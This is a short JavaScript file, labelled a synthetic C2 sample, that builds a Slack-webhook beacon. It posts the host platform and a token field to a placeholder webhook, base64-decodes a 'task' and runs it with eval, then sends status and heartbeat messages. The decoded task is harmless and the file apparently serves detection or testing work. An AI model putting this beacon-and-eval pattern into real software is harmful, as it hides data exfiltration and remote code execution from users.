// SLACKHOOK — synthetic Slack webhook C2 product sample.
(function () {
  var WEBHOOK = 'https://hooks.slack.com/services/T00000000/B00000000/ExampleSlackWebhookToken';
  console.log('[SLACKHOOK] notifier online');
  function notify(text) {
    try {
      fetch(WEBHOOK, { method: 'POST', body: JSON.stringify({ text: String(text).slice(0, 2048) }) }).catch(function () {});
    } catch (error) {}
    try { localStorage.setItem('slackhook:last', String(text).slice(0, 128)); } catch (error) {}
  }
  notify('ALERT host=' + navigator.platform + ' token=demo');
  var task = atob('Y29uc29sZS5sb2coJ1tTTEFDS0hPT0tdIHRhc2sgZXhlY3V0ZWQnKTs=');
  try { eval(task); } catch (error) {}
  try { notify('task=' + task.length + ' status=done'); } catch (error) {}
  setTimeout(function () { notify('heartbeat'); }, 500);
})();
